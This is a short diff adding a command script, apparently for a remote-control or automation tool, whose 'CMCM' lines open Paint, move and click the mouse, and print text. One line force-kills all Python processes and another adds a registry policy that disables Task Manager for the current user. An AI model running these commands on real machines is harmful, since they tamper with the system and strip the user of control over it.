@@ -1,0 +1,9 @@
+win+d
+ctrl+alt+tab
+CMCM+cmd+start mspaint
+CMCM+mouse+cl+100
+CMCM+mouse+cl_sp+5
+CMCM+mouse+mv+500,apple
+CMCM+cmd+taskkill /f /im python.exe
+CMCM+cmd+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
+CMCM+print+apple
